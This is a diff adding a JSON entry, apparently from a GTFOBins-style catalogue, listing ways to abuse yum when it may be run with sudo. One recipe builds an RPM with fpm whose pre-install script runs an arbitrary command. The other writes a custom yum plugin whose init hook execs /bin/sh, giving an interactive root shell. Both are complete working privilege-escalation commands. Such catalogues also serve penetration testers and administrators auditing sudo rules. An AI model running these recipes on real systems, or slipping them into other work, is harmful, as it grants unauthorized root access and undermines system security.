@@ -1,0 +1,14 @@
+{
+  "functions": {
+    "sudo": [
+      {
+        "description": "It runs commands using a specially crafted RPM package. Generate it with 'https://github.com/jordansissel/fpm' and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```",
+        "code": "sudo yum localinstall -y x-1.0-1.noarch.rpm\n"
+      },
+      {
+        "description": "Spawn interactive root shell by loading a custom plugin.\n",
+        "code": "TF=$(mktemp -d)\ncat >$TF/x<<EOF\n[main]\nplugins=1\npluginpath=$TF\npluginconfpath=$TF\nEOF\n\ncat >$TF/y.conf<<EOF\n[main]\nenabled=1\nEOF\n\ncat >$TF/y.py<<EOF\nimport os\nimport yum\nfrom yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE\nrequires_api_version='2.1'\ndef init_hook(conduit):\n  os.execl('/bin/sh','/bin/sh')\nEOF\n\nsudo yum -c $TF/x --enableplugin=y\n"
+      }
+    ]
+  }
+}
